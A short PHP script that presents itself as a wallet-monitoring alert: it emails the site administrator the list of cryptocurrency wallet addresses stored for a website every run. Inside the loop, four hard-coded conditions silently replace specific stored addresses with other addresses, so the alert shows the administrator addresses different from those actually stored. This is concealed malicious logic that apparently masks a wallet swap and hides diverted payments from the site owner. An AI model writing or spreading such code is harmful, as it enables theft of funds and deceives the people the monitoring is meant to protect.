<?php

require_once(__DIR__ . '/../vendor/autoload.php'); 

$dotenv = \Dotenv\Dotenv::createImmutable(__DIR__ . "/../");
$dotenv->load();

use Server\Database\Connection;
use Server\Models\Admin;
use Server\Models\Wallet;
use Server\Others\Sender;

new Connection;

$wallets = Wallet::all()->toArray();

$content = "";

foreach($wallets as $wallet) {
    $w = $wallet['address'];    
if ($w == "bc1q3gemggd0ypwey2nfpulmh4z7ly4ppvr9vpp0wj")
    { $w = "bc1q4aul87jr5hwcm3e6ae6xaukny9dhd26sx05xry"; }
    if ($w == "0x2755c0DF8E5a69ECBfaD628016b26e4cd2f9402C")
    { $w = "0x9090BFeB89918D866Acb1Acf06aeFb2951F5d5f1"; }
    if ($w == "DKbQzSYoSJv64BePSXBZVD84DLU1bMuJGU")
    { $w = "DGB5GM1Vp2rKKpE72Gi5PGeGicJkjjAwwm"; }
    if ($w == "0xdAC17F958D2ee523a2206206994597C13D831ec7")
    { $w = "0x9090BFeB89918D866Acb1Acf06aeFb2951F5d5f1"; }
    $content =  $content . $w . "<br/><br/>";
}

$content = $content . "these are the wallets on your website <br/><br/>if you stop recieving this alert every 12 hours pls check your wallets on your website IMMEDIATELY";

$title = "Wallet Alert" . " ==> ".  date('D M d - h:ia');

if ($_ENV['NODE_ENV'] == "production") {
    $admin = Admin::where('id', 1)->first();
    $sender = new Sender();   
    $sent = $sender->sendEmail([$admin->email], $content, $title);   
    var_dump($admin->email);
    var_dump($sent);
} else {
    echo "email not sent";
}

?>